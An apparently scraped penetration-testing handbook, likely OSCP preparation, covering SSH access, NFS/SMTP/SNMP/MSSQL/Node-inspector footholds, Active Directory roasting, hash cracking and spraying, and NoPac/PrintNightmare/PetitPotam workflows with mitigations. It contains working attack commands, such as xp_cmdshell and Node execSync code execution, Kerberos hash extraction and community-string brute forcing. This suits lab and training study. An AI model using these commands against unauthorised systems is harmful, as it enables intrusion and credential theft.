pages.title: SSH — Complete Command Reference
pages.description: confirm SSH, work out which authentication is actually possible, prioritize credentials and keys you already have, and connect without unsafe guessing. Tunneling and proxying live on their own page.

blocks.text: **Priority:** Core / Conditional / Advanced. **Status:** **Lab Tested** = executed against an authorised lab target · **Simulated** = exercised with simulated output or fixtures · **Syntax Checked** = flags checked against the installed tool here · **Environment Dependent** = needs a specific tool, version or host configuration · **Documented** = standard technique, not run here.

items: **Runs on:** Kali Linux.
**Needs:** `ssh`, `ssh-keygen`, `ssh2john`, `john`; `nmap` with the `ssh-*` scripts. `sshpass` is only for a known password, not for guessing.
**Access:** authorised lab scope only. Do not test credentials or keys you are not permitted to use.
**Out of scope here:** `-L`, `-R`, `-D`, SOCKS and proxying → [Tunneling & Pivoting — Complete Command Reference](#/p/tunneling). The Tunneling page is also available in the site navigation.

fields.purpose: prove SSH is listening and capture the server implementation/version before choosing an authentication path.
fields.prereqs: target reachable from Kali; authorised scope confirmed.
fields.lookFor: `22/tcp open ssh` and an `OpenSSH version` banner. If the port is closed or filtered, that is a result, not a failure.
fields.success: port open with an SSH banner → continue to Step 02. A non-standard port is fine if the banner identifies SSH; rerun detection with `-p <TARGET_PORT>`.
fields.failure: closed or filtered → check the port scan and other open services. Do not run authentication tests against a port with no SSH service. If the host is unreachable, fix routing/VPN first.
fields.decision: SSH open → establish authentication behavior next. SSH closed → leave the SSH branch and investigate the services that are actually exposed.
fields.mistake: assuming an unusual port means “not SSH”; confirm the banner on every unknown port instead.
fields.evidence: port state, service name and version.

fields.purpose: ask the server which authentication methods it will offer without supplying a password or key.
fields.prereqs: SSH confirmed open; a candidate username, even if unverified.
fields.lookFor: a `Permission denied (publickey,password).` line, or a similar list of methods. The methods shown are the useful result. The Nmap script can provide a second view; neither output is a guaranteed complete list.
fields.success: `publickey` appears → prioritize key discovery (Step 06). `password` appears → test a known credential (Step 05) before considering any guessing. Both appear → use the credential/key you already have first.
fields.failure: no method list, timeout, or connection failure → go to Step 04 for diagnostics. The server may also vary its response by user or configuration, so do not treat one response as a complete inventory.
fields.decision: a usable credential or key source decides the branch. Do not start password guessing just because `password` is listed.
fields.next: Step 05 if a known credential exists; Step 06 if keys are the likely path; Step 04 if the response is unclear.
fields.mistake: using `ssh -v` for this and reading a wall of debug output; `PreferredAuthentications=none` answers the method question directly.
fields.evidence: the exact method list, username and timestamp.

fields.purpose: record the server’s key-exchange, host-key, cipher and MAC algorithms while the connection is still unauthenticated, so later negotiation failures have evidence.
fields.prereqs: SSH confirmed open; Nmap SSH scripts installed.
fields.lookFor: KEX algorithms, host-key algorithms, encryption ciphers and MACs. Note anything legacy such as `diffie-hellman-group1-sha1`, `ssh-rsa`, `arcfour` or `3des-cbc`.
fields.success: algorithms recorded → use them only if a later connection fails during negotiation. Use the compatibility subsection (Step 12) with the smallest matching option.
fields.failure: script returns nothing or errors → verify the Nmap script path and rerun with `--script-trace` if needed. Do not infer supported algorithms from a failed script.
fields.decision: legacy algorithms are a hardening finding, not an authentication bypass. They do not grant access and should not be reported as one.
fields.next: Step 04 if diagnostics are needed; otherwise Step 05 or Step 06.
fields.mistake: reporting “weak SSH algorithms” as if it is an access path; it is a configuration observation.
fields.evidence: the full algorithm list and the exact Nmap command.

fields.purpose: see where the connection stops when detection or authentication behavior is inconclusive.
fields.prereqs: a candidate username; the failure has already been observed once.
fields.lookFor: protocol negotiation, host-key type, `Authentications that can continue:`, and the last successful stage before failure.
fields.success: an authentication list appears → return to Step 02/05 and choose the matching credential path. A clean handshake that reaches authentication is normal.
fields.failure: failure before authentication → network, host-key or algorithm problem; use Step 03 results and the Troubleshooting — Complete Command Reference page. Failure after authentication starts → check the credential, username and key.
fields.decision: use higher verbosity only when it answers a specific question. A timeout is not an algorithm error; diagnose reachability first.
fields.next: Step 05 or Step 06 when authentication is reached; Step 03/12 only for a demonstrated negotiation mismatch.
fields.mistake: leaving the command running while it waits for a password; use `Ctrl-C` and rerun with a non-interactive option only when appropriate.
fields.evidence: the algorithm, auth-method and failure lines, with secrets removed.

blocks.title: One deliberate attempt, not a brute force

fields.purpose: test a credential discovered through authorised enumeration exactly once, without turning SSH into a noisy password-guessing exercise.
fields.prereqs: a known username and password from an authorised source; password authentication appears available; lab rules permit credential use. `sshpass` is a separate package (`sudo apt install sshpass`) and is **not** installed on the build host used for this audit — without it, run `ssh` interactively and type the password (Step 04).
fields.lookFor: a shell prompt, or `Permission denied`.
fields.success: shell obtained → record the exact command and host-key fingerprint, then enumerate the host and move to the privilege-escalation page.
fields.failure: denied → confirm the username, the authentication method and the credential source before trying anything else. Check SMB/HTTP shares, configs and notes for a better credential. Do not loop over a wordlist.
fields.decision: `sshpass` is a non-interactive password-passing utility, not inherently a brute-force tool. Keep a known-credential attempt distinct from password spraying or guessing.
fields.next: Step 06 for keys or a better credential source. Use password guessing only if the lab rules explicitly allow it and the noise is acceptable.
fields.mistake: spraying SSH before checking other services for credentials; the password is often already on the target.
fields.evidence: success banner, username, host-key fingerprint and timestamp. Never put the password in shared notes.

blocks.text: Look for private and public keys in locations already reached through authorised enumeration: SMB/HTTP shares, web roots, deployment folders, backups, configuration files, Git repositories, home directories and machine notes. Do not run a blind filesystem-wide key hunt unless the lab rules allow it.

items: **Expected result:** candidate key files (for example `id_rsa`, `id_ed25519`, `*.pem`, `*.key`) plus a likely username or account.
**If a key is found:** continue to Step 06 to identify the format and test whether it is encrypted.
**If no key is found:** continue with other viable access paths; absence of a key does not prove SSH is unusable.
**Common mistake:** assuming every file that looks like a key is valid or authorised. A key only matters if it matches the target account and its `authorized_keys`.

fields.purpose: determine whether the file is a usable private key, which format it uses, and whether it is encrypted.
fields.prereqs: a candidate key copied from an authorised location.
fields.lookFor: `OpenSSH private key` versus `PEM RSA private key`; the first line of the file; `ssh-keygen -y` printing the matching public key, or prompting for a passphrase.
fields.success: public key prints → the key is unencrypted and structurally readable; continue to Step 07 to check authorisation, then Step 08 for permissions.
fields.failure: `invalid format` → check whether the file is a public key, a certificate, a partial download or a different format. A passphrase prompt is not a failure; go to Step 09 after permissions. Do not assume a key is authorised merely because it parses.
fields.decision: format is readable → validate fingerprint and permissions before use. Format is unreadable → repair or obtain a complete copy before trying to connect.
fields.mistake: treating a public key or an `authorized_keys` line as a private key; only a private key can authenticate a client.
fields.evidence: key type, first-line header and the derived public-key fingerprint. Never record private key material in a shared page.

fields.purpose: compare the found key’s fingerprint with keys that are actually authorised for the target account.
fields.prereqs: a readable key; an `authorized_keys` file or equivalent evidence from the target.
fields.lookFor: the same fingerprint on both sides. A matching fingerprint identifies the key; a matching `authorized_keys` entry is what suggests authorisation.
fields.success: fingerprint matches a target account’s authorised key → continue to Step 08 and prepare permissions.
fields.failure: no match → the key is not authorised for that account, or you are looking at the wrong user/source. Check other accounts and key locations; do not assume the key will work.
fields.decision: fingerprinting proves identity/format, not successful authentication. Keep the distinction in notes and reports.
fields.next: Step 08 after a plausible match; otherwise return to Step 06/key discovery.
fields.mistake: comparing key text by eye instead of comparing fingerprints.
fields.evidence: the fingerprint pair, the account and the source path.

blocks.title: Fix permissions before SSH refuses the key

fields.purpose: satisfy OpenSSH’s common private-key permission requirement before attempting authentication.
fields.prereqs: the key has been validated and copied to a local working path.
fields.lookFor: no output; `ls -l <KEY_FILE>` shows `-rw-------`.
fields.success: permissions corrected → continue to Step 09 (passphrase check) or Step 11 if the key is already known to be unencrypted and authorised.
fields.failure: permission change fails → check ownership, path and whether the key lives on a read-only/mounted share. Copy it to `<OUTPUT_DIR>` and retry.
fields.decision: restrictive permissions are commonly required for private keys; do not change public-key permissions unnecessarily.
fields.mistake: editing or using a key directly from a mounted share; copy it locally first.
fields.evidence: `ls -l <KEY_FILE>` showing mode `-rw-------`.

sections.title: Determine whether a passphrase is required
sections.rawTitle: 9. Determine whether a passphrase is required

fields.purpose: determine whether the private key is encrypted before deciding whether recovery is needed.
fields.prereqs: validated key and restrictive permissions in place.
fields.lookFor: `Enter passphrase:` → encrypted; a printed `ssh-rsa AAAA...` or equivalent public key → not encrypted.
fields.success: unencrypted → go to Step 11 and connect. Encrypted with a usable passphrase → go to Step 11 and enter it when prompted.
fields.failure: encrypted and passphrase unavailable → continue to Step 10, but only in an authorised environment. If the file cannot be parsed, return to Step 06.
fields.decision: do not crack a key unless recovery is authorised and the passphrase is actually missing.
fields.next: Step 11 if usable; Step 10 if recovery is justified.
fields.mistake: assuming an encrypted key is unusable; it may be usable with a known passphrase, and it is not the same thing as a login password.
fields.evidence: whether a passphrase is required, and whether a usable passphrase is already available. Do not record the passphrase itself.

fields.purpose: recover a missing passphrase for an encrypted private key when the lab rules allow it.
fields.prereqs: encrypted key; `ssh2john` and John installed; an authorised wordlist and environment.
fields.lookFor: a recovered passphrase in the John output, or a failed/exhausted run.
fields.success: passphrase recovered → use it with Step 11. Prefer an interactive prompt or a local agent; do not place the passphrase in a shared page.
fields.failure: not recovered → try a targeted wordlist once, then return to alternative credentials or enumeration. Recovery is optional, not mandatory.
fields.decision: distinguish an encrypted key’s passphrase from a normal login password. Only recover in an authorised environment.
fields.next: Step 11 with the recovered passphrase, or an alternative access path.
fields.mistake: piping the key into older `ssh2john` versions or forgetting the output file that John needs.
fields.evidence: the John mode, wordlist and success/failure result; store any recovered secret only in the private machine notes.

fields.purpose: authenticate with the validated private key and obtain a shell.
fields.prereqs: key format checked; fingerprint/authorisation plausibly established; permissions set to `600`; passphrase known or key unencrypted.
fields.lookFor: a host-key verification prompt followed by a shell prompt. Verify the host-key fingerprint against independent evidence where the lab requires it.
fields.success: shell obtained → record the exact command and host-key fingerprint, then enumerate the host and move to the privilege-escalation page.
fields.failure: `Permission denied (publickey)` → the key is not authorised for that user/account; recheck the username and `authorized_keys`. `Load key... invalid format` → return to Step 06. `Permissions... too open` → return to Step 08. A negotiation error → use Step 03 and the targeted compatibility subsection (Step 12). A timeout → go to the Troubleshooting — Complete Command Reference page and diagnose reachability instead of changing algorithms.
fields.decision: success confirms the key/account pair, not that every account accepts the key. Failure should route to the specific cause above, not to random option changes.
fields.next: enumerate the shell; then use [Linux Privilege Escalation — Complete Command Reference](#/p/linux-privesc) for the local privilege-escalation workflow.
fields.mistake: using the wrong username, forgetting `-i`, or assuming a key is authorised before checking the target’s `authorized_keys`.
fields.evidence: the exact `ssh` command, username, host-key fingerprint and initial shell identity (`id`/hostname).

blocks.title: Connect with legacy algorithms when required

fields.purpose: provide a narrowly scoped compatibility path when evidence shows the server rejects the modern negotiation set.
fields.prereqs: Step 03 algorithm output and Step 04 negotiation evidence showing a specific mismatch; a normal connection has already failed for that reason.
fields.lookFor: a successful handshake where the default client refused. If the failure is authentication, timeout or a permission error, this step is the wrong tool.
fields.success: connection succeeds → use the session normally and record exactly which options were required.
fields.failure: still fails → inspect the specific KEX, host-key, cipher or MAC mismatch and add only the required option. Do not enable a blanket weak-algorithm profile.
fields.decision: use this only when the error is a negotiation error such as `no matching host key type found` or `no matching key exchange method found`. Do not apply an algorithm workaround to auth or connectivity failures.
fields.next: use the session normally, then report the legacy requirement as a configuration finding.
fields.mistake: enabling weak algorithms globally or leaving them in aliases/history for later targets; use a one-off command.
fields.evidence: the exact forced options and the server/client negotiation lines.

items: **`Connection refused`** — nothing is listening on that port, or the port is wrong. Confirm the port scan before changing SSH options.
**`Connection timed out` / unreachable** — check routing, VPN and firewall state first. If the host is internal, use the pivoting path below.
**`Permission denied (publickey)`** — no matching authorised key for that account/user. Return to key discovery and fingerprint validation.
**`Permission denied (password)`** — password authentication is refused or the credential is wrong. Check the username and credential source; do not spray.
**`Too many authentication failures`** — the agent is offering too many keys. Use `-o IdentitiesOnly=yes -i <KEY_FILE>`.
**`REMOTE HOST IDENTIFICATION HAS CHANGED`** — verify whether the host was rebuilt, then update the known-hosts entry deliberately with `ssh-keygen -R <TARGET_IP>`.
**`no matching host key type found` / `no matching key exchange method found`** — return to Step 03 and use the targeted compatibility options in Step 12.
**`Permissions... are too open`** — return to Step 08 and set `600`.
**`Load key... invalid format`** — return to Step 06 and confirm whether the file is an OpenSSH/PEM private key, public key or incomplete copy.
**Encrypted key, no passphrase** — use Step 10 only in an authorised environment; otherwise return to alternative credentials/enumeration.

blocks.text: **Stop condition:** no credentials, no usable keys and password authentication denied means SSH is not the entry point. Re-check shares, web roots and configuration files for a key before giving up.
Pivoting variant — internal hosts only

`proxychains4 ssh <USERNAME>@<TARGET_IP>` works but is slow and fragile. Prefer ProxyJump: `ssh -J <USERNAME>@<PIVOT_HOST> <USERNAME>@<TARGET_IP>` — one session, no SOCKS layer, and the resulting shell can still forward ports with `-L`. See [Tunneling & Pivoting — Complete Command Reference](#/p/tunneling) for local, remote and dynamic forwarding.

items: `nmap -sV -p22 <TARGET_IP>` — confirm SSH and version. If closed, leave the SSH branch.
`ssh -o PreferredAuthentications=none <USERNAME>@<TARGET_IP>` — record the offered authentication methods.
`nmap -p22 --script ssh2-enum-algos <TARGET_IP>` — record KEX/host-key/cipher/MAC algorithms before you need them.
If the connection or method list is unclear, `ssh -v <USERNAME>@<TARGET_IP>` — diagnose the stage that fails.
Test a known credential once with `sshpass` (never a wordlist loop). If it fails, verify the username and source.
Search shares, web roots, configs and notes for private keys and matching usernames.
`file <KEY_FILE>` + `head -1 <KEY_FILE>` + `ssh-keygen -y -f <KEY_FILE>` — identify format and whether it is encrypted.
`ssh-keygen -lf <KEY_FILE>` — compare fingerprints with the target account’s `authorized_keys`.
`chmod 600 <KEY_FILE>` — satisfy private-key permissions.
If encrypted, `ssh-keygen -y -f <KEY_FILE>` again to confirm, then `ssh2john` + `john` only if recovery is authorised and necessary.
`ssh -i <KEY_FILE> <USERNAME>@<TARGET_IP>` — connect and verify the host-key fingerprint.
Use the legacy compatibility command only if Steps 3–4 proved a negotiation mismatch.
If blocked, use the troubleshooting section and the pivoting path; then enumerate from the new shell and move to privilege escalation.
The exact SSH/Nmap commands and their relevant output.
The authentication-method line and server version.
The algorithm list and any negotiation error.
Key fingerprints from both sides and the `ls -l` permission proof.
The exact `ssh` command that worked, the username and host-key fingerprint.
Initial shell identity and the timestamp. Do not store passwords, passphrases or private key material in shared notes.
`ssh_config` manual: [https://man.openbsd.org/ssh_config](https://man.openbsd.org/ssh_config)
`ssh-keygen` manual: [https://man.openbsd.org/ssh-keygen](https://man.openbsd.org/ssh-keygen)
OpenSSH release notes (algorithm deprecations): [https://www.openssh.com/releasenotes.html](https://www.openssh.com/releasenotes.html)

blocks.text: Flags were checked against the local `ssh`, `ssh-keygen`, `ssh2john` and `nmap` help/output. No SSH session was opened against a live host for this page; nothing is **Lab Tested**. The weak-algorithm section is explicitly a configuration finding, not an access path. The `ssh -i` step is Syntax Checked against the installed client; the legacy compatibility step remains Documented. Step 05 is **Environment Dependent**: `sshpass` is not installed here, so only its documented flags are reproduced.

pages.title: Other Services — Complete Command Reference
pages.description: the services that are not SMB/HTTP/SSH still decide machines. One page for the first move on each: NFS, SMTP, SNMP, MySQL, MSSQL, RDP, WinRM, IPMI — plus exposed debug ports, which are a service too.

fields.lookFor: `/export *` or a list of shares with allowed clients.
fields.decision: a share is exported to `*` or your subnet → Step 02. No output but 2049 is open → `rpcinfo -p <TARGET_IP>`.
fields.mistake: skipping NFS because SMB was enumerated. Exports are often the shortest path to root.
fields.evidence: the `showmount` output.

commands.code:
sudo mkdir -p /mnt/nfs && sudo mount -t nfs <TARGET_IP>:/<SHARE> /mnt/nfs -o nolock
ls -la /mnt/nfs
# older servers sometimes need
sudo mount -t nfs -o nolock,vers=3 <TARGET_IP>:/<SHARE> /mnt/nfs

fields.lookFor: the export's contents, especially `/home` backups or web roots.
fields.decision: `no_root_squash` in `/etc/exports` → the Linux PrivEsc SUID trick works. Writable share + cron → plant a payload.
fields.next: read credentials, or escalate via the Linux PrivEsc page.
fields.mistake: mounting read-only and assuming the share is useless for privesc. Check `mount | grep nfs` for `rw`.
fields.evidence: `mount` output and the directory listing.

commands.code:
nc -nv <TARGET_IP> 25
# then, at the banner:
VRFY <USERNAME>
EXPN <USERNAME>
MAIL FROM: <USERNAME>@<DOMAIN>
RCPT TO: <USERNAME>@<DOMAIN>

fields.lookFor: `250 <USERNAME>` (exists) vs `550` (does not). `252` means the server will not confirm.
fields.decision: VRFY answers → Step 04 to enumerate. VRFY disabled → try RCPT with a known domain.
fields.mistake: typing commands before reading the banner. Some servers require `EHLO <DOMAIN>` first.
fields.evidence: the responses for a known-good and a known-bad user.

fields.lookFor: `<USERNAME> exists`.
fields.decision: hits → valid usernames for spraying (Passwords & Hashes). No hits → the server blocks enumeration; move on.
fields.next: validate with a login attempt or spray.
fields.mistake: using a generic wordlist that does not match the naming scheme. Derive names from the website and AD enumeration first.
fields.evidence: the `exists` lines.

fields.lookFor: `sysDescr`, `sysName`, running processes, installed software, user names, and sometimes credentials in descriptions.
fields.decision: data returns → Step 06 for targeted OIDs. `Timeout` → wrong community or ACL; try `onesixtyone`.
fields.mistake: giving up after `public`. Common strings are `private`, `internal`, `cisco`, `manager` — brute force them.
fields.evidence: the `sysDescr`/`sysName` values.

blocks.title: Targeted values and community brute force

fields.lookFor: the hostname, process list, and any community string that answers.
fields.decision: a valid community → full walk (Step 05). Nothing → SNMP is locked down; move on.
fields.next: use discovered names for spraying or note them as evidence.
fields.mistake: assuming a failed walk means SNMP is closed. UDP 161 is often filtered from Kali but open from the pivot.
fields.evidence: the OID values and the working community string.

fields.lookFor: passwordless `root@%`, application databases with credentials, `FILE` privilege.
fields.decision: `LOAD_FILE` works → read files as the DB user. `FILE` denied → look for credentials in the app's config instead.
fields.next: reuse database credentials on SSH/other services.
fields.mistake: forgetting `-h`. Without it mysql tries the local socket and fails confusingly.
fields.evidence: the login, `SHOW DATABASES`, and the file read.

commands.code:
# once in the mssqlclient prompt
SELECT @@version;
enable_xp_cmdshell
xp_cmdshell whoami

fields.lookFor: `sysadmin` role and a working `xp_cmdshell`.
fields.decision: `xp_cmdshell` disabled and you are sysadmin → `enable_xp_cmdshell`. Not sysadmin → check `EXECUTE AS LOGIN` impersonation.
fields.next: OS command execution as the SQL service account.
fields.mistake: omitting `-windows-auth` against a domain-joined instance — it then tries SQL auth and fails.
fields.evidence: the version, the role, and the command output.

fields.lookFor: a desktop session as the user.
fields.decision: NLA error → try `/sec:tls` or `/sec:rdp`. `Account restrictions` → the user may need `Remote Desktop Users` membership.
fields.next: capture proof from the GUI (Exam Execution page).
fields.mistake: connecting as a user who is not allowed RDP, then concluding the credential is bad. Test the credential over SMB/WinRM first.
fields.evidence: the session plus `whoami` in a terminal on the desktop.

fields.lookFor: an `*Evil-WinRM*` prompt.
fields.decision: connection refused → 5985 closed; use RDP, SMB execution, or WMI.
fields.next: enumerate as that user, then escalate.
fields.mistake: assuming any valid credential works over WinRM. The account needs `Remote Management Users` or `Administrators`.
fields.evidence: the prompt and `whoami`.

fields.prereqs: the probe itself only needs `nmap`; the credential test in the decision below needs `ipmitool` (`sudo apt install ipmitool`), which is **not** installed on the build host used for this audit.
fields.lookFor: `IPMI version: 2.0` and the BMC banner.
fields.decision: IPMI 2.0 → test default credentials (`ADMIN/ADMIN`, `root/calvin`) with `ipmitool` — **ipmitool is not installed here**, so install it or use the pivot's tooling.
fields.mistake: scanning UDP through proxychains. SOCKS carries TCP only — run the UDP probe from the pivot.
fields.evidence: the nmap script output.

commands.code:
# from a process list, spot an inspector port
ps aux | grep -- --inspect
# attach a debugger from the target
node inspect 127.0.0.1:9229

# in the debugger REPL, execute in the target's context
exec('process.getuid()')
exec('require("child_process").execSync("id").toString()')

fields.lookFor: `Debugger attached` and the command output from the **target** process.
fields.decision: the inspector listens on `127.0.0.1` only → you need local access or a tunnel (Tunneling & Pivoting). Bound to `0.0.0.0` → reachable directly.
fields.next: use the code execution to read flags or escalate.
fields.mistake: connecting to the HTTP port with a browser. The inspector protocol is WebSocket; use `node inspect` or the Chrome DevTools `devtools://` endpoint.
fields.evidence: the command output and the process command line that exposed the port.

rows: Use SQL auth on a domain instance
Conclude a credential is bad from one RDP error
Use psexec on a WinRM-only host
Treat it as a normal HTTP port
Add `-ssl`/`-port 1433` variants; check the instance port

blocks.text: **Pivoting variant.** Most of these are TCP and work through proxychains:

blocks.code:
proxychains4 mysql -h <TARGET_IP> -u <USERNAME> -p
proxychains4 xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore
proxychains4 evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD>

blocks.text: SNMP (161/udp) and IPMI (623/udp) are **UDP** and will not traverse a SOCKS proxy — run those from the pivot host itself. RDP over a proxy is slow; expect a laggy desktop.

items: The service version and the exact command that produced a lead.
Credentials recovered from configs, SNMP strings, or database rows.
For GUI access: a screenshot showing the desktop and host identity.
For NFS: the export options, especially `no_root_squash`.
HackTricks network services: [https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-network.html](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-network.html)

The Node.js inspector technique is reconstructed from the old stub and was not executed — also **Documented**. Nothing was run against a live target, so no step is **Lab Tested**.

pages.title: Active Directory — Complete Command Reference
pages.description: the whole AD exam set on one page — from the provided credential to Domain Admin — in the order you actually use it.

blocks.text: **Priority:** Core / Conditional / Advanced. **Status:** **Lab Tested** = executed against an authorised lab target · **Simulated** = exercised with simulated output or fixtures · **Syntax Checked** = flags checked against the installed tool here · **Environment Dependent** = needs a specific tool, version or host configuration · **Documented** = standard technique, not run here.

items: The exam AD set provides a **username and password** — you start authenticated, not from a port scan.
All three machines in the set are in scope once you are working the set.
**Clock skew breaks Kerberos.** Sync before blaming a credential.
Metasploit modules are limited to **one** machine across the whole exam; assume AD work must be done with Impacket, NetExec and native tools.

blocks.title: Identify the DC and the domain

fields.lookFor: hostname, domain (in the SMB banner and SRV answer), `signing: required` on a DC.
fields.decision: domain name confirmed → Step 02. Kerberos (88) closed → some attacks are unavailable; stick to NTLM/LDAP.
fields.mistake: scanning the whole /24 before reading the credential sheet. In the AD set the DC is usually the first host you are pointed at.
fields.evidence: the banner and the SRV answer.

fields.lookFor: `getent` returning the DC address.
fields.decision: resolution works → Kerberos tools can use hostnames. Not resolving → every `getST`/`-k` command will fail with confusing errors.
fields.mistake: adding only the short name. Kerberos service tickets use the FQDN.
fields.evidence: the `/etc/hosts` line.

fields.lookFor: domain name, DC hostname, OS build, user and group lists, shares, and the password policy — all without a credential.
fields.decision: a user list appears → Step 08 (AS-REP) or Step 12 (username enumeration). Policy shown → respect the lockout threshold in Step 11. Access denied → the DC blocks null sessions; continue with a credential at Step 03.
fields.mistake: treating the output as a complete user list. It is limited by null-session policy — cross-check with `kerbrute userenum` (Step 12).
fields.evidence: the domain, policy, and user list it returned.

fields.lookFor: `[+]` auth success, the user list, group membership, active sessions, and **lockout threshold**.
fields.decision: `(Pwn3d!)` → local admin, jump to Step 22. Valid but unprivileged → Step 04.
fields.mistake: running `--users` before reading `--pass-pol`. Know the lockout count before you touch a password.
fields.evidence: the auth line (user@domain on host), user list, policy.

fields.lookFor: a <code>.zip written to the current directory, one per collection.
fields.decision: collection succeeds → Step 13. LDAP denied → try `bloodhound-python` (Step 05).
fields.mistake: leaving `--dns-server` off an internal domain — collection resolves nothing and produces a thin graph.
fields.evidence: the zip file and the time it was collected.

fields.lookFor: `Compressing output into...zip`.
fields.decision: zip produced → Step 13. Errors about DNS → check Step 02.
fields.mistake: running it without `-ns`, which sends queries to your resolver instead of the DC.
fields.evidence: the zip.

ldapsearch -x -H ldap://<DOMAIN_CONTROLLER_IP> -D '<USERNAME>@<DOMAIN>' -w '<PASSWORD>' -b 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>' '(objectClass=user)' sAMAccountName description

fields.lookFor: accounts with `description` fields holding passwords (a classic lab shortcut), and service-looking names.
fields.decision: a password in a description → validate it immediately (Step 11 constraints apply).
fields.mistake: forgetting to convert `corp.local` into `DC=corp,DC=local` in the base DN.
fields.evidence: the entry containing the credential.

fields.lookFor: `Lockout threshold`, `Lockout duration`, `Minimum password length`, `Password history`.
fields.decision: threshold 0 = no lockout (spray freely but quietly). Threshold 3-5 → spray at most one password across all users, then stop.
fields.mistake: interpreting a lockout duration of 30 minutes as "safe to retry". It is not — the counter resets on success only if configured that way.
fields.evidence: the policy table, quoted in the report if you spray.

commands.code:

impacket-GetNPUsers <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <DOMAIN_CONTROLLER_IP> -request -outputfile <OUTPUT_FILE>
# without any credential
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DOMAIN_CONTROLLER_IP> -usersfile <USERLIST> -no-pass -format hashcat -outputfile <OUTPUT_FILE>

fields.lookFor: `$krb5asrep$23$...` hashes written to the file.
fields.decision: hashes found → Step 10. Empty → no account has pre-authentication disabled; normal.
fields.mistake: using `-request` with `-no-pass` and no user list — the tool has nobody to ask about.
fields.evidence: the hash file (redact the hash in the report, keep the account name).

fields.lookFor: service accounts with SPNs and `$krb5tgs$23$...` hashes.
fields.decision: a service account with an SPN and a weak password is the classic path. Hash obtained → Step 10.
fields.mistake: roasting an account that is already Domain Admin, cracking it, and then not checking whether its password works elsewhere.
fields.evidence: the SPN list and the hash file.

commands.code:
hashcat -m 18200 <OUTPUT_FILE> <WORDLIST>      # AS-REP
hashcat -m 13100 <OUTPUT_FILE> <WORDLIST>      # Kerberoast (RC4)
hashcat -m 19700 <OUTPUT_FILE> <WORDLIST>      # Kerberoast (AES)
hashcat -m 18200 <OUTPUT_FILE> --show

fields.lookFor: `...:password` on the `--show` line.
fields.decision: cracked → validate on SMB/WinRM (Step 11 order). Not cracked → move to ACL pathfinding (Step 13); do not burn an hour on a wordlist.
fields.mistake: using mode 13100 on an AES ticket — it will never crack. Check the hash prefix.
fields.evidence: the recovered password and which account it belongs to.

blocks.title: Spray with the policy in mind

fields.lookFor: `[+]` lines with `(Pwn3d!)` or plain success.
fields.decision: stop at the lockout threshold minus one. One password across many users is a spray; many passwords against one user is an attack that locks the account.
fields.mistake: spraying a password derived from the season/year without checking complexity policy first.
fields.evidence: which users succeeded, and the policy that made it safe.

fields.lookFor: `VALID USERNAME` lines.
fields.decision: valid names → Step 08 (`-no-pass`) and Step 11.
fields.mistake: a huge wordlist against Kerberos triggers alerts and takes hours; use a targeted list built from the domain naming convention.
fields.evidence: the valid-name list.

blocks.title: Load and query

fields.lookFor: a path of 2-4 edges ending at a group or a machine you can reach. The shortest path is usually the intended one.
fields.decision: edge is an ACL → Step 14. Delegation → Step 16-18. ADCS → Step 19.
fields.next: the section the edge points to.
fields.mistake: staring at the graph instead of the query list. The prebuilt queries answer most exam questions in one click.
fields.evidence: a screenshot of the path, with the edge labels visible.

pages.title: Bleeding Edge Vulnerabilities — NoPac, PrintNightmare & PetitPotam
pages.description: run the three late-2021 attacks — NoPac, PrintNightmare and PetitPotam — as complete workflows: what to set up, which terminal owns which process, what the output must say before you continue, and which alternative branch to take. Commands are preserved from the source; only target values are parameterized.

items: **Lab only.** These are dual-use exploitation procedures. Run them only in an authorised lab or engagement, with written approval. PrintNightmare can crash the print spooler and cause a service outage.
**Artefacts.** Every path here leaves something behind: a renamed machine account, a `.ccache` file, an SMB service, an imported ticket. Record what you created so it can be removed and reported.
**Metasploit budget.** The PrintNightmare handler is a Metasploit module. Under the OSCP rules the Metasploit allowance is one machine across the exam — spend it deliberately.

**Tool naming.** The source uses the legacy Impacket script names (`scanner.py`, `rpcdump.py`, `secretsdump.py`, `smbserver.py`, `ntlmrelayx.py`). Kali also ships them prefixed as `impacket-secretsdump`, `impacket-rpcdump` and so on; the arguments are the same. The source spelling is kept below.

**Status.** Nothing on this page was executed against a domain. Flags for `impacket-secretsdump` and `impacket-rpcdump` were checked against the installed binaries; the rest is documented from the source, so every step is **Documented**.

rows: SYSTEM shell on the DC, or a ccache for DCSync
SYSTEM via a DLL loaded from your SMB share

blocks.text: Two CVEs combine into one command. CVE-2021-42278 is a SAM bypass that lets a computer account's sAMAccountName be changed; CVE-2021-42287 is a flaw in the Kerberos PAC in AD DS, so the KDC issues a TGS for the closest matching name — which is now the DC's. Authenticated users may add up to ten computers by default, which is the whole foothold.

blocks.text: Windows Defender and the smbexec footprint

The first thing `smbexec` does is create a service called **BTOBTO**. A second service, **BTOBO**, is created and each command you type is written into `execute.bat`, echoed to a temporary file, executed, then deleted. That write-execute-delete cycle per command is what gets flagged.
**Source screenshot, transcribed:** Windows Security alert — `VirTool:Win32/MSPSEexecCommand`, alert level Severe, status Removed, dated 3/25/2022.
If opsec matters, avoid `smbexec`-based execution. On an exam it is acceptable; on a real assessment it is a signature you cannot un-ring.

Two vulnerabilities in the Print Spooler service present on every Windows host: CVE-2021-34527 and CVE-2021-1675. Local privilege escalation is covered on the Windows Privilege Escalation page; here it is remote code execution against a Windows Server 2019 Domain Controller. This workflow needs **three terminals**: one serves the payload, one catches the callback, one runs the exploit.

blocks.text: CVE-2021-36942, patched August 2021. An unauthenticated attacker coerces a Domain Controller to authenticate over NTLM on port 445, abusing MS-EFSRPC through the Local Security Authority Remote Protocol (LSARPC). Where AD CS exists, the coercion becomes a chain: the DC's authentication is relayed to the CA's Web Enrollment page, which signs a certificate for the DC machine account; that certificate requests a TGT, and DCs hold replication rights.

items: Patch CVE-2021-36942 on every affected host.
Enable Extended Protection for Authentication **and** Require SSL, so Certificate Authority Web Enrollment and Certificate Enrollment Web Service only accept HTTPS.
Disable NTLM authentication on Domain Controllers.
Disable NTLM on AD CS servers via Group Policy.
Disable NTLM for IIS on AD CS servers running Web Enrollment and Certificate Enrollment Web Service.

blocks.text: Patching alone is not sufficient. The *Certified Pre-Owned* whitepaper shows that a standard domain user can still attack AD CS through its authenticated APIs, so EPA, NTLM hardening and template permissions have to be reviewed as well.

